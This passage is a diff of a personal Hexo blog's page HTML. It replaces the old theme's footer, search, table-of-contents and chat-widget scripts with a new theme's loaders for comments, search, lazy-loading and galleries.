+<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a><a class="buttom" onclick="util.scrollComment()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M10.46 1.25h3.08c1.603 0 2.86 0 3.864.095c1.023.098 1.861.3 2.6.752a5.75 5.75 0 0 1 1.899 1.899c.452.738.654 1.577.752 2.6c.095 1.004.095 2.261.095 3.865v1.067c0 1.141 0 2.036-.05 2.759c-.05.735-.153 1.347-.388 1.913a5.75 5.75 0 0 1-3.112 3.112c-.805.334-1.721.408-2.977.43a10.81 10.81 0 0 0-.929.036c-.198.022-.275.054-.32.08c-.047.028-.112.078-.224.232c-.121.166-.258.396-.476.764l-.542.916c-.773 1.307-2.69 1.307-3.464 0l-.542-.916a10.605 10.605 0 0 0-.476-.764c-.112-.154-.177-.204-.224-.232c-.045-.026-.122-.058-.32-.08c-.212-.023-.49-.03-.93-.037c-1.255-.021-2.171-.095-2.976-.429A5.75 5.75 0 0 1 1.688 16.2c-.235-.566-.338-1.178-.389-1.913c-.049-.723-.049-1.618-.049-2.76v-1.066c0-1.604 0-2.86.095-3.865c.098-1.023.3-1.862.752-2.6a5.75 5.75 0 0 1 1.899-1.899c.738-.452 1.577-.654 2.6-.752C7.6 1.25 8.857 1.25 10.461 1.25M6.739 2.839c-.914.087-1.495.253-1.959.537A4.25 4.25 0 0 0 3.376 4.78c-.284.464-.45 1.045-.537 1.96c-.088.924-.089 2.11-.089 3.761v1c0 1.175 0 2.019.046 2.685c.045.659.131 1.089.278 1.441a4.25 4.25 0 0 0 2.3 2.3c.515.214 1.173.294 2.429.316h.031c.398.007.747.013 1.037.045c.311.035.616.104.909.274c.29.17.5.395.682.645c.169.232.342.525.538.856l.559.944a.52.52 0 0 0 .882 0l.559-.944c.196-.331.37-.624.538-.856c.182-.25.392-.476.682-.645c.293-.17.598-.24.909-.274c.29-.032.639-.038 1.037-.045h.032c1.255-.022 1.913-.102 2.428-.316a4.25 4.25 0 0 0 2.3-2.3c.147-.352.233-.782.278-1.441c.046-.666.046-1.51.046-2.685v-1c0-1.651 0-2.837-.089-3.762c-.087-.914-.253-1.495-.537-1.959a4.25 4.25 0 0 0-1.403-1.403c-.464-.284-1.045-.45-1.96-.537c-.924-.088-2.11-.089-3.761-.089h-3c-1.651 0-2.837 0-3.762.089" clip-rule="evenodd"/><path fill="currentColor" d="M9 11a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0"/></svg><span>参与讨论</span></a></div></widget>
+</div></aside><div class='float-panel blur'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
 </div>
+</div><div class="scripts">
+<script type="text/javascript">
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+  };
 
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+  };
+  const deps = {
+    jquery: `https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js`,
+    marked: `https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js`
+  }
+  
 
+</script>
 
-<!-- 代码块功能依赖 -->
-<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+<script type="text/javascript">
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
 
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')){
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
 
-  <!-- 是否加载使用自带的 prismjs. -->
-  <script type="text/javascript" src="/libs/prism/prism.js"></script>
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+    
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      let retryTimes = 3;
+      utils.onLoading(el);
+      function req() {
+        return new Promise((resolve, reject) => {
+          let status = 0; // 0 等待 1 完成 2 超时
+          let timer = setTimeout(() => {
+            if (status === 0) {
+              status = 2;
+              timer = null;
+              reject('请求超时');
+              if (retryTimes == 0) {
+                onFailure();
+              }
+            }
+          }, 5000);
+          fetch(url).then(function(response) {
+            if (status !== 2) {
+              clearTimeout(timer);
+              resolve(response);
+              timer = null;
+              status = 1;
+            }
+            if (response.ok) {
+              return response.json();
+            }
+            throw new Error('Network response was not ok.');
+          }).then(function(data) {
+            retryTimes = 0;
+            utils.onLoadSuccess(el);
+            callback(data);
+          }).catch(function(error) {
+            if (retryTimes > 0) {
+              retryTimes -= 1;
+              setTimeout(() => {
+                req();
+              }, 5000);
+            } else {
+              utils.onLoadFailure(el);
+              onFailure();
+            }
+          });
+        });
+      }
+      req();
+    },
+  };
+</script>
 
-
-<!-- 代码语言 -->
-
-
-<!-- 代码块复制 -->
-
-<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
-
-
-<!-- 代码块收缩 -->
-
-<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
-
-
-
-    </div>
-    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
-        <div class="toc-widget card" style="background-color: white;">
-            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
-            <div id="toc-content"></div>
-        </div>
-    </div>
-</div>
-
-<!-- TOC 悬浮按钮. -->
-
-<div id="floating-toc-btn" class="hide-on-med-and-down">
-    <a class="btn-floating btn-large bg-color">
-        <i class="fas fa-list-ul"></i>
-    </a>
-</div>
-
-
-<script src="/libs/tocbot/tocbot.min.js"></script>
 <script>
-    $(function () {
-        tocbot.init({
-            tocSelector: '#toc-content',
-            contentSelector: '#articleContent',
-            headingsOffset: -($(window).height() * 0.4 - 45),
-            collapseDepth: Number('3'),
-            headingSelector: 'h2, h3, h4, h5, h6'
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.28.1" async></script>
+
+<!-- optional -->
+
+  <script>
+    function load_twikoo() {
+        if (!document.querySelectorAll("#twikoo_container")[0]) return;
+        utils.js('https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js', {defer: true}).then(function () {
+            const el = document.getElementById("twikoo_container");
+            var path = el.getAttribute('comment_id');
+            if (!path) {
+                path = decodeURI(window.location.pathname);
+            }
+            twikoo.init(Object.assign({"js":"https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js","envId":"https://blog-comments-phi.vercel.app"}, {
+                el: '#twikoo_container',
+                path: path,
+            }));
         });
+    }
 
-        // Set scroll toc fixed.
-        let tocHeight = parseInt($(window).height() * 0.4 - 64);
-        let $tocWidget = $('.toc-widget');
-        $(window).scroll(function () {
-            let scroll = $(window).scrollTop();
-            /* add post toc fixed. */
-            if (scroll > tocHeight) {
-                $tocWidget.addClass('toc-fixed');
-            } else {
-                $tocWidget.removeClass('toc-fixed');
-            }
-        });
-
-        
-        /* 修复文章卡片 div 的宽度. */
-        let fixPostCardWidth = function (srcId, targetId) {
-            let srcDiv = $('#' + srcId);
-            if (srcDiv.length === 0) {
-                return;
-            }
-
-            let w = srcDiv.width();
-            if (w >= 450) {
-                w = w + 21;
-            } else if (w >= 350 && w < 450) {
-                w = w + 18;
-            } else if (w >= 300 && w < 350) {
-                w = w + 16;
-            } else {
-                w = w + 14;
-            }
-            $('#' + targetId).width(w);
-        };
-
-        // 切换TOC目录展开收缩的相关操作.
-        const expandedClass = 'expanded';
-        let $tocAside = $('#toc-aside');
-        let $mainContent = $('#main-content');
-        $('#floating-toc-btn .btn-floating').click(function () {
-            if ($tocAside.hasClass(expandedClass)) {
-                $tocAside.removeClass(expandedClass).hide();
-                $mainContent.removeClass('l9');
-            } else {
-                $tocAside.addClass(expandedClass).show();
-                $mainContent.addClass('l9');
-            }
-            fixPostCardWidth('artDetail', 'prenext-posts');
-        });
-        
+    window.addEventListener('DOMContentLoaded', (event) => {
+        load_twikoo();
     });
 </script>
 
-    
-
-</main>
 
 
-
-
-    <footer class="page-footer bg-color">
-    
-
-    <div class="container row center-align"
-         style="margin-bottom: 0px !important;">
-        <div class="col s12 m8 l8 copy-right">
-            Copyright&nbsp;&copy;
-            
-                <span id="year">2019-2024</span>
-            
-            <a href="/about" target="_blank">hybcx</a>
-            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
-            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
-            
-            <br>
-            
-                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">861.1k</span>
-            
-            
-            
-            
-                <span id="busuanzi_container_site_pv">
-                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
-                    <span id="busuanzi_value_site_pv" class="white-color"></span>
-            </span>
-            
-            
-                <span id="busuanzi_container_site_uv">
-                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
-                    <span id="busuanzi_value_site_uv" class="white-color"></span>
-            </span>
-            
-            <br>
-
-            <!-- 运行天数提醒. -->
-            
-            <br>
-            
-        </div>
-        <div class="col s12 m4 l4 social-link ">
-    <a href="https://github.com/hybchenxing/" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
-        <i class="fab fa-github"></i>
-    </a>
-
-
-
-    <a href="mailto:2235199080@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
-        <i class="fas fa-envelope-open"></i>
-    </a>
-
-
-
-    <a href="https://www.facebook.com/profile.php?id=61555427038857" class="tooltipped" target="_blank" data-tooltip="关注我的Facebook: https://www.facebook.com/profile.php?id=61555427038857" data-position="top" data-delay="50">
-        <i class="fab fa-facebook-f"></i>
-    </a>
-
-
-
-
-
-    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2235199080" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2235199080" data-position="top" data-delay="50">
-        <i class="fab fa-qq"></i>
-    </a>
-
-
-
-
-
-
-
-    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
-        <i class="fas fa-rss"></i>
-    </a>
-
-</div>
-    </div>
-</footer>
-
-<div class="progress-bar"></div>
-
-
-    <!-- 搜索遮罩框 -->
-<div id="searchModal" class="modal">
-    <div class="modal-content">
-        <div class="search-header">
-            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
-            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
-                   class="search-input">
-        </div>
-        <div id="searchResult"></div>
-    </div>
-</div>
-
-<script type="text/javascript">
-$(function () {
-    var searchFunc = function (path, search_id, content_id) {
-        'use strict';
-        $.ajax({
-            url: path,
-            dataType: "xml",
-            success: function (xmlResponse) {
-                // get the contents from search data
-                var datas = $("entry", xmlResponse).map(function () {
-                    return {
-                        title: $("title", this).text(),
-                        content: $("content", this).text(),
-                        url: $("url", this).text()
-                    };
-                }).get();
-                var $input = document.getElementById(search_id);
-                var $resultContent = document.getElementById(content_id);
-                $input.addEventListener('input', function () {
-                    var str = '<ul class=\"search-result-list\">';
-                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
-                    $resultContent.innerHTML = "";
-                    if (this.value.trim().length <= 0) {
-                        return;
-                    }
-                    // perform local searching
-                    datas.forEach(function (data) {
-                        var isMatch = true;
-                        var data_title = data.title.trim().toLowerCase();
-                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
-                        var data_url = data.url;
-                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
-                        var index_title = -1;
-                        var index_content = -1;
-                        var first_occur = -1;
-                        // only match artiles with not empty titles and contents
-                        if (data_title !== '' && data_content !== '') {
-                            keywords.forEach(function (keyword, i) {
-                                index_title = data_title.indexOf(keyword);
-                                index_content = data_content.indexOf(keyword);
-                                if (index_title < 0 && index_content < 0) {
-                                    isMatch = false;
-                                } else {
-                                    if (index_content < 0) {
-                                        index_content = 0;
-                                    }
-                                    if (i === 0) {
-                                        first_occur = index_content;
-                                    }
-                                }
-                            });
-                        }
-                        // show search results
-                        if (isMatch) {
-                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
-                            var content = data.content.trim().replace(/<[^>]+>/g, "");
-                            if (first_occur >= 0) {
-                                // cut out 100 characters
-                                var start = first_occur - 20;
-                                var end = first_occur + 80;
-                                if (start < 0) {
-                                    start = 0;
-                                }
-                                if (start === 0) {
-                                    end = 100;
-                                }
-                                if (end > content.length) {
-                                    end = content.length;
-                                }
-                                var match_content = content.substr(start, end);
-                                // highlight all keywords
-                                keywords.forEach(function (keyword) {
-                                    var regS = new RegExp(keyword, "gi");
-                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
-                                });
-
-                                str += "<p class=\"search-result\">" + match_content + "...</p>"
-                            }
-                            str += "</li>";
-                        }
-                    });
-                    str += "</ul>";
-                    $resultContent.innerHTML = str;
-                });
-            }
-        });
-    };
-
-    searchFunc('/search.xml', 'searchInput', 'searchResult');
-});
-</script>
-
-    <!-- 白天和黑夜主题 -->
-<div class="stars-con">
-    <div id="stars"></div>
-    <div id="stars2"></div>
-    <div id="stars3"></div>  
-</div>
-
-<script>
-    function switchNightMode() {
-        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
-        setTimeout(function () {
-            $('body').hasClass('DarkMode') 
-            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
-            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
-            
-            setTimeout(function () {
-            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
-                $(this).remove()
-            })
-            }, 2e3)
-        })
-    }
-</script>
-
-    <!-- 回到顶部按钮 -->
-<div id="backTop" class="top-scroll">
-    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
-        <i class="fas fa-arrow-up"></i>
-    </a>
-</div>
-
-
-    <script src="/libs/materialize/materialize.min.js"></script>
-    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
-    <script src="/libs/aos/aos.js"></script>
-    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
-    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
-    <script src="/js/matery.js"></script>
-
-    
-
-    
-    
-    
-        
-        <script type="text/javascript">
-            // 只在桌面版网页启用特效
-            var windowWidth = $(window).width();
-            if (windowWidth > 768) {
-                document.write('<script type="text/javascript" src="/libs/others/sakura.js"><\/script>');
-            }
-        </script>
-    
-
-    <!-- 雪花特效 -->
-    
-
-    <!-- 鼠标星星特效 -->
-    
-
-     
-        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
-        <script src="/libs/others/TencentCaptcha.js"></script>
-        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
-    
-
-    <!-- Baidu Analytics -->
-
-    <!-- Baidu Push -->
-
-<script>
-    (function () {
-        var bp = document.createElement('script');
-        var curProtocol = window.location.protocol.split(':')[0];
-        if (curProtocol === 'https') {
-            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
-        } else {
-            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
         }
-        var s = document.getElementsByTagName("script")[0];
-        s.parentNode.insertBefore(bp, s);
-    })();
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+  });
 </script>
 
-    
-    <script src="/libs/others/clicklove.js" async="async"></script>
-    
-    
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"></script><script defer src="https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+</script><script>
+  ctx.fancybox = {
+    selector: `.timenode p>img`,
+    css: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css`,
+    js: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js`
+  };
+  var selector = '[data-fancybox]:not(.error)';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const els = document.getElementsByClassName('ds-memos');
+    if (els != undefined && els.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
+        }
+      });
+    })
+  }
+</script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script defer src="https://cdn.bootcdn.net/ajax/libs/scrollReveal.js/4.0.9/scrollreveal.min.js"></script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const slideUp = {
+      distance: `16px`,
+      duration: `800`,
+      interval: `100`,
+      scale: `1`,
+      opacity: 0,
+      easing: "ease-out"
+    };
+    ScrollReveal().reveal('.l_left .slide-up', slideUp);
+    ScrollReveal().reveal('.l_main .slide-up', slideUp);
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
 
-    
-        <script src="//code.tidio.co/7sfvbaabl5mp7up6avakdatk7dbm4xow.js"></script>
-        <script>
-            $(document).ready(function () {
-                setInterval(change_Tidio, 50);
-                function change_Tidio() {
-                    var tidio=$("#tidio-chat iframe");
-                    if(tidio.css("display")=="block"&& $(window).width()>977 ){
-                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" &&$(window).width()>977)>0? "-40px" : ($("div.toc-title").length&&$(window).width()>977)>0?"85px":"20px";
-                        document.getElementById("tidio-chat-iframe").style.right="-15px";
-                        document.getElementById("tidio-chat-iframe").style.height=parseInt(tidio.css("height"))>=520?"520px":tidio.css("height");
-                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
-                    }
-                    else if(tidio.css("display")=="block"&&$(window).width()>601 &&$(window).width()<992 ){
-                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && 601< $(window).width()<992)>0? "-40px":"20px" ;
-                        document.getElementById("tidio-chat-iframe").style.right="-15px";
-                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
-                    }
-                    else if(tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))<230){
-                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && $(window).width()<601)>0? "-10px":"45px" ;
-                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
-                    }
-                    if( tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))>=230){
-                        document.getElementById("tidio-chat-iframe").style.zIndex="998";
-                    }
-                }
-            });
-        </script>
-    
 
-    
-
-    <!--腾讯兔小巢-->
-    
-    
-
-    
-
-    
-
-    
-    <script src="/libs/instantpage/instantpage.js" type="module"></script>
-    
-
-</body>
-
-</html>
+<!-- inject -->
+<script type="text/javascript" src="/custom/js/ZYDark.js"></script>
+</div></body></html>
